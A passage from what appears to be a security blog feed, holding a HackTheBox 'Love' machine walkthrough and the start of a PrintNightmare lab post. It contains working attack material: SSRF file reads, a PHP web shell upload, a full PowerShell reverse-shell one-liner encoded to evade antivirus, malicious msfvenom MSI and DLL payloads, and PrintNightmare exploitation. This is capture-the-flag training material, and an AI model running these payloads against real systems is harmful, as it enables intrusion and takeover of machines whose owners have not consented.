<p>On HTTPS, the SSL certificate leaks an email address and a potential username: <code>roy@love.htb</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210809005318725.png" alt="image-20210809005318725"  /></div>
</p>
<p>And both the HTTPS versions of <code>www.love.htb</code> and <code>staging.love.htb</code> return the Forbidden message error.</p>
<p><div class="img-container"><img src="imgs/image-20210809012934262.png" alt="image-20210809012934262"  /></div>
</p>
<p><div class="img-container"><img src="imgs/image-20210809012945191.png" alt="image-20210809012945191"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-phoebe">Shell as phoebe</h3>
<h4 id="ssrf">SSRF</h4>
<p>The behavior of the file scanner on <code>staging.love.htb</code> making a HTTP (not always) request can be abused to access internal resources that previously were inaccessible due to IP restrictions. This attack is often referred as Server-Side Request Forgery (SSRF).</p>
<p>When I submit <code>file:///C:/xampp/apache/conf/extra/httpd-vhosts.conf</code>, it returns the virtual host configuration file.</p>
<p><div class="img-container"><img src="imgs/image-20210809033303050.png" alt="image-20210809033303050"  /></div>
</p>
<p>The string &ldquo;C:/xampp/htdocs/passwordmanager&rdquo; immediately draws my attention. Based on that config, the service on port 5000 is a password manager, and the access is limited to only allow connections from <code>127.0.0.1</code>.</p>
<p>Assuming there is an index file, I try to submit  <code>file:///C:/xampp/htdocs/passwordmanager/index.php</code> , and the file is exist.</p>
<p><div class="img-container"><img src="imgs/image-20210809034759102.png" alt="image-20210809034759102"  /></div>
</p>
<p>Now if I submit <code>file:///C:/xampp/htdocs/passwordmanager/creds.txt</code>, it returns the following:</p>
<p><div class="img-container"><img src="imgs/image-20210809034943436.png" alt="image-20210809034943436"  /></div>
</p>
<p>Alternatively, I can just visit <code>http://127.0.0.1:5000/</code> and the file scanner will render the page of password manager, in which contains the admin credentials.</p>
<p><div class="img-container"><img src="imgs/image-20210809033828889.png" alt="image-20210809033828889"  /></div>
</p>
<p>I can use that creds to access the admin dashboard.</p>
<p><div class="img-container"><img src="imgs/image-20210809034300363.png" alt="image-20210809034300363"  /></div>
</p>
<h4 id="php-webshell">PHP webshell</h4>
<p>On  <code>admin/voters.php</code>, there is a photo upload feature.</p>
<p><div class="img-container"><img src="imgs/image-20210809035502402.png" alt="image-20210809035502402"  /></div>
</p>
<p>I will intercept the request to modify the photo section to a PHP web shell and then send it afterwards. It gets uploaded smoothly.</p>
<p><div class="img-container"><img src="imgs/image-20210809040225250.png" alt="image-20210809040225250"  /></div>
</p>
<p>When I reload the page, I see the voter I added is there with broken photo, and that because it loads my PHP web shell as image.</p>
<p><div class="img-container"><img src="imgs/image-20210809041027772.png" alt="image-20210809041027772"  /></div>
</p>
<p>The uploaded web shell is accessible at  <code>http://www.love.htb/images/shell.php</code>, and now I have code execution as <strong>phoebe</strong>.</p>
<p><div class="img-container"><img src="imgs/image-20210809040810276.png" alt="image-20210809040810276"  /></div>
</p>
<h4 id="interactive-shell-access">Interactive shell access</h4>
<p>To get an interactive shell I will use a PowerShell one-liner reverse shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «love» «10.10.14.51» 
</span></span><span class="line"><span class="cl">$ cat exploits/revshell.ps1
</span></span><span class="line"><span class="cl"><span class="nv">$client</span> <span class="o">=</span> New-Object System.Net.Sockets.TCPClient<span class="o">(</span><span class="s1">&#39;10.10.14.51&#39;</span>,53<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span> <span class="o">=</span> <span class="nv">$client</span>.GetStream<span class="o">()</span><span class="p">;</span><span class="o">[</span>byte<span class="o">[]]</span><span class="nv">$bytes</span> <span class="o">=</span> 0..65535<span class="p">|</span>%<span class="o">{</span>0<span class="o">}</span><span class="p">;</span><span class="k">while</span><span class="o">((</span><span class="nv">$i</span> <span class="o">=</span> <span class="nv">$stream</span>.Read<span class="o">(</span><span class="nv">$bytes</span>, 0, <span class="nv">$bytes</span>.Length<span class="o">))</span> -ne 0<span class="o">){</span><span class="p">;</span><span class="nv">$data</span> <span class="o">=</span> <span class="o">(</span>New-Object -TypeName System.Text.ASCIIEncoding<span class="o">)</span>.GetString<span class="o">(</span><span class="nv">$bytes</span>,0, <span class="nv">$i</span><span class="o">)</span><span class="p">;</span><span class="nv">$sendback</span> <span class="o">=</span> <span class="o">(</span>iex <span class="nv">$data</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> Out-String <span class="o">)</span><span class="p">;</span><span class="nv">$sendback2</span> <span class="o">=</span> <span class="nv">$sendback</span> + <span class="s1">&#39;PS &#39;</span> + <span class="o">(</span><span class="nb">pwd</span><span class="o">)</span>.Path + <span class="s1">&#39;&gt; &#39;</span><span class="p">;</span><span class="nv">$sendbyte</span> <span class="o">=</span> <span class="o">([</span>text.encoding<span class="o">]</span>::ASCII<span class="o">)</span>.GetBytes<span class="o">(</span><span class="nv">$sendback2</span><span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Write<span class="o">(</span><span class="nv">$sendbyte</span>,0,<span class="nv">$sendbyte</span>.Length<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Flush<span class="o">()}</span><span class="p">;</span><span class="nv">$client</span>.Close<span class="o">()</span>
</span></span></code></pre></div><p>Because it is a Windows machine, I will encoded it with base64 to avoid AV.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «love» «10.10.14.51» 
</span></span><span class="line"><span class="cl">$ cat exploits/revshell.ps1<span class="p">|</span> iconv -t UTF-16LE<span class="p">|</span> base64 -w0
</span></span><span class="line"><span class="cl"><span class="nv">JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4ANQAxACcALAA1ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgA</span><span class="o">=</span>
</span></span></code></pre></div><p>I will setup a listener and leverage the web shell to execute my payload.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">http://www.love.htb/images/shell.php?f<span class="o">=</span>powershell.exe -enc <span class="nv">JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4ANQAxACcALAA1ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgA</span><span class="o">=</span>
</span></span></code></pre></div><p>On my listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «love» «10.10.14.51» 
</span></span><span class="line"><span class="cl">$ rlwrap nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.51<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.239<span class="o">]</span> <span class="m">49950</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\o</span>mrs<span class="se">\i</span>mages&gt;
</span></span></code></pre></div><p>The user flag is done here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>esktop&gt; dir
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>esktop
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Mode                 LastWriteTime         Length Name                                                                 
</span></span><span class="line"><span class="cl">----                 -------------         ------ ----                                                                 
</span></span><span class="line"><span class="cl">-ar---          8/8/2021   3:50 AM             <span class="m">34</span> user.txt                                                             
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>esktop&gt; <span class="nb">type</span> user.txt
</span></span><span class="line"><span class="cl">65a5...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>The flag also accessible using SSRF.</p>
<p><div class="img-container"><img src="imgs/image-20210809043334065.png" alt="image-20210809043334065"  /></div>
</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-system">Shell as SYSTEM</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>WinPEAS finds that <code>AlwaysInstallElevated</code> is set to 1. This means installation of an app always runs in elevated mode (SYSTEM), and it can be abused to install a malicious <code>.msi</code> package.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">[+] Checking AlwaysInstallElevated
</span></span><span class="line"><span class="cl">   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
</span></span><span class="line"><span class="cl">    AlwaysInstallElevated set to 1 in HKLM!
</span></span><span class="line"><span class="cl">    AlwaysInstallElevated set to 1 in HKCU!
</span></span></code></pre></div><h4 id="exploitation---malicious-msi-installer">Exploitation - Malicious .msi Installer</h4>
<p>I will generate a malicious <code>.msi</code> that will add a user with administrative access using <code>msfvenom</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.51» 
</span></span><span class="line"><span class="cl">$ msfvenom -p windows/adduser <span class="nv">USER</span><span class="o">=</span>iamf <span class="nv">PASS</span><span class="o">=</span>P@ssword123! -f msi -o iamf.msi
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x86 from the payload
</span></span><span class="line"><span class="cl">No encoder specified, outputting raw payload
</span></span><span class="line"><span class="cl">Payload size: <span class="m">270</span> bytes
</span></span><span class="line"><span class="cl">Final size of msi file: <span class="m">159744</span> bytes
</span></span><span class="line"><span class="cl">Saved as: iamf.msi
</span></span></code></pre></div><p>I will host the <code>.msi</code> using Python web server.</p>
<p>On Love, I will grab the msi and install the package immediately.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>ublic&gt; curl.exe -O 10.10.14.53/iamf.msi
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>ublic&gt; msiexec /quiet /qn /i iamf.msi
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>ublic&gt; net user
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User accounts <span class="k">for</span> <span class="se">\\</span>LOVE                                                                                                                                                   
</span></span><span class="line"><span class="cl">                                                                                                                                                                           
</span></span><span class="line"><span class="cl">-------------------------------------------------------------------------------                                                                                            
</span></span><span class="line"><span class="cl">Administrator            DefaultAccount           Guest                                                                                                                    
</span></span><span class="line"><span class="cl">iamf                     Phoebe                   WDAGUtilityAccount                                                                                                       
</span></span><span class="line"><span class="cl">The <span class="nb">command</span> completed successfully.                                                                                                                                        
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>ublic&gt; 
</span></span></code></pre></div><h4 id="psexec---system">Psexec - SYSTEM</h4>
<p>I can login using my backdoor user with help of <code>psexec.py</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ psexec.py love/iamf:<span class="s1">&#39;P@ssword123!&#39;</span>@10.10.10.239                                            
</span></span><span class="line"><span class="cl">Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Requesting shares on 10.10.10.239.....
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found writable share ADMIN$
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Uploading file VlzRTIEE.exe
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Opening SVCManager on 10.10.10.239.....
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Creating service lRbn on 10.10.10.239.....
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Starting service lRbn.....
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.19042.867<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> <span class="m">2020</span> Microsoft Corporation. All rights reserved.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;whoami
</span></span><span class="line"><span class="cl">nt authority<span class="se">\s</span>ystem
</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;hostname
</span></span><span class="line"><span class="cl">love
</span></span></code></pre></div><h4 id="alternative-printnightmare">(Alternative) PrintNightmare</h4>
<p>Love also vulnerable to LPE <a href="https://github.com/calebstewart/CVE-2021-1675">PrintNightmare</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>ownloads&gt; Get-Service -name spooler
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Status   Name               DisplayName
</span></span><span class="line"><span class="cl">------   ----               -----------
</span></span><span class="line"><span class="cl">Running  spooler            Print Spooler
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>ownloads&gt; curl.exe -O 10.10.14.51/CVE-2021-1675.ps1
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>ownloads&gt; Import-Module .<span class="se">\C</span>VE-2021-1675.ps1
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>ownloads&gt; Invoke-Nightmare
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>ownloads&gt; net user
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User accounts <span class="k">for</span> <span class="se">\\</span>LOVE
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-------------------------------------------------------------------------------
</span></span><span class="line"><span class="cl">adm1n                    Administrator            DefaultAccount           
</span></span><span class="line"><span class="cl">Guest                    iamf                     Phoebe                   
</span></span><span class="line"><span class="cl">WDAGUtilityAccount       
</span></span><span class="line"><span class="cl">The <span class="nb">command</span> completed successfully.
</span></span></code></pre></div><p>I can login via WinRM.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «love» «10.10.14.51» 
</span></span><span class="line"><span class="cl">$ evil-winrm -i 10.10.10.239 -u <span class="s1">&#39;adm1n&#39;</span> -p<span class="s1">&#39;P@ssw0rd&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Evil-WinRM shell v2.4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>dm1n<span class="se">\D</span>ocuments&gt; hostname
</span></span><span class="line"><span class="cl">Love
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>Play with PrintNightmare using HackTheBox machines</title>
      <link>https://fahmifj.github.io/blog/play-with-printnightmare/</link>
      <pubDate>Sat, 17 Jul 2021 13:52:01 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/play-with-printnightmare/</guid>
      <description>Having fun with a Zero-Day vulnerability</description>
      <content:encoded><![CDATA[<p>A lot of InfoSec pros I follow on Twitter have been <em>tweeting</em> about a remote code execution vulnerability in the Windows Print Spooler service that could be used for privilege escalation and furthermore, it affects all the Windows versions. Microsoft has assigned CVE-2021-34527 to the vulnerability, which is now publicly known as PrintNightmare.  This vulnerability was accidentally disclosed by security researchers from China, Zhiniang Peng and Xuefeng Li, after Microsoft released a security patch on June 8, 2021 for CVE-2021-1675, which is also a remote code execution in the Print Spooler service. The researchers thought their finding was CVE-2021-1675, but it turned out to be different.</p>
<p>I’m neither an expert nor an infosec pro, so I won’t dive into any technical thing about the vulnerability. In this post, I&rsquo;ll just play around with the PoC to own <a href="http://hackthebox.eu/">HackTheBox</a> <a href="https://www.hackthebox.eu/newsroom/htb-take-it-easy-july-2021">retired machines</a>.</p>
<h2 id="preparation">Preparation</h2>
<p>There are several PoC exploits out there for PrintNightmare, but I will use the one that created by <a href="https://www.hackthebox.eu/profile/9164">Cube0x0</a>. To use the exploit, I will have to change my impacket version to the one that has been modified by Cube0x0.  But, changing the currently installed Impacket could potentially mess up my Kali. Therefore, I will use a Python virtual environment using <code>virtualenv</code> module. If I don&rsquo;t have it, I can run the following command to install the module.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ python3 -m pip install virtualenv
</span></span></code></pre></div><p>The exploit also requires a DLL for later to be loaded on the target machines. This DLL will be hosted on a Samba server, and it should be configured to allow anonymous access, so that the exploit can directly grab the DLL.</p>
<h4 id="working-directory">Working Directory</h4>
<p>First thing first, is a working directory/folder, which I will create one under <code>/opt</code> called <code>printnightmare</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «opt» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ mkdir printnightmare <span class="o">&amp;&amp;</span> <span class="nb">cd</span> printnightmare
</span></span></code></pre></div><p>Inside the <code>printnightmare</code>, I will clone the cube0x0 impacket as well as the exploit (<code>CVE-2021-1675-cube0x0</code>).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «printnightmare» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ git clone https://github.com/cube0x0/impacket <span class="o">&amp;&amp;</span> git clone https://github.com/cube0x0/CVE-2021-1675.git CVE-2021-1675-cube0x0
</span></span></code></pre></div><p>Next, I will create a virtual environment called  <code>impacket-venv</code> using <code>virtualenv</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «printnightmare» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ virtualenv impacket-venv
</span></span><span class="line"><span class="cl">created virtual environment CPython3.9.2.final.0-64 in 614ms
</span></span><span class="line"><span class="cl">  creator CPython3Posix<span class="o">(</span><span class="nv">dest</span><span class="o">=</span>/opt/printnightmare/impacket-venv, <span class="nv">clear</span><span class="o">=</span>False, <span class="nv">no_vcs_ignore</span><span class="o">=</span>False, <span class="nv">global</span><span class="o">=</span>False<span class="o">)</span>
</span></span><span class="line"><span class="cl">  seeder FromAppData<span class="o">(</span><span class="nv">download</span><span class="o">=</span>False, <span class="nv">pip</span><span class="o">=</span>bundle, <span class="nv">setuptools</span><span class="o">=</span>bundle, <span class="nv">wheel</span><span class="o">=</span>bundle, <span class="nv">via</span><span class="o">=</span>copy, <span class="nv">app_data_dir</span><span class="o">=</span>/home/kali/.local/share/virtualenv<span class="o">)</span>
</span></span><span class="line"><span class="cl">    added seed packages: <span class="nv">pip</span><span class="o">==</span>21.1.3, <span class="nv">setuptools</span><span class="o">==</span>57.1.0, <span class="nv">wheel</span><span class="o">==</span>0.36.2
</span></span><span class="line"><span class="cl">  activators BashActivator,CShellActivator,FishActivator,PowerShellActivator,PythonActivator,XonshActivator
</span></span></code></pre></div><p>Then, I will activate the virtual environment with the following commands.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «printnightmare» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ <span class="nb">source</span> impacket-venv/bin/activate
</span></span></code></pre></div><p>Now I can just install the cube0x0 impacket.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «printnightmare» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ <span class="nb">cd</span> impacket <span class="o">&amp;&amp;</span> python3 setup.py install
</span></span><span class="line"><span class="cl">running install
</span></span><span class="line"><span class="cl">running bdist_egg
</span></span><span class="line"><span class="cl">running egg_info
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><h4 id="dll-payload">DLL Payload</h4>
<p>Before generating a DLL, I will create a <code>dll</code> folder first under the <code>printnightmare</code> folder.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «printnightmare» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ mkdir dll
</span></span></code></pre></div><p>I will be using <code>msfvenom</code> to generate the DLL . Upon a successful exploitation, this DLL will connect back to my attacking machine on port 4444, in short, it&rsquo;s a reverse shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «dll» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.75 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f dll &gt; revshell.dll  
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x64 from the payload
</span></span><span class="line"><span class="cl">No encoder specified, outputting raw payload
</span></span><span class="line"><span class="cl">Payload size: <span class="m">460</span> bytes
</span></span><span class="line"><span class="cl">Final size of dll file: <span class="m">8704</span> bytes
</span></span></code></pre></div><blockquote>
<p>If you want to compile your own, go <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own">here</a> or see <a href="#troubleshoot">Troubleshoot</a></p>
</blockquote>
<h4 id="samba-server-configuration">Samba Server Configuration</h4>
<p>In the exploit repo, cube0x0 also provides a guide on how to configure a Samba server for hosting the DLL payload. I will follow cube0x0&rsquo;s guide, but I will add some additional lines for logging.</p>
<p>First, I will create a backup of the original Samba configuration file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «printnightmare» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ sudo cp /etc/samba/smb.conf<span class="o">{</span>,.bak<span class="o">}</span>
</span></span></code></pre></div><p>Then I will replace the entire <code>smb.conf</code> contents with the following:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">[global]
</span></span><span class="line"><span class="cl">   server role = standalone server
</span></span><span class="line"><span class="cl">   smb ports = 445
</span></span><span class="line"><span class="cl">   map to guest = bad user
</span></span><span class="line"><span class="cl">   usershare allow guests = yes
</span></span><span class="line"><span class="cl">   idmap config * : backend = tdb
</span></span><span class="line"><span class="cl">   log file = /var/log/samba/log.%m
</span></span><span class="line"><span class="cl">   max log size = 1000
</span></span><span class="line"><span class="cl">   logging = file
</span></span><span class="line"><span class="cl">   
</span></span><span class="line"><span class="cl">[ef]
</span></span><span class="line"><span class="cl">    comment = Samba
</span></span><span class="line"><span class="cl">    path = /opt/printnightmare/dll
</span></span><span class="line"><span class="cl">    guest ok = yes
</span></span><span class="line"><span class="cl">    read only = no
</span></span><span class="line"><span class="cl">    browsable = yes
</span></span></code></pre></div><p>Lastly, I will start the Samba service.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «printnightmare» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ sudo systemctl start smbd 
</span></span></code></pre></div><h2 id="target-machines">Target Machines</h2>
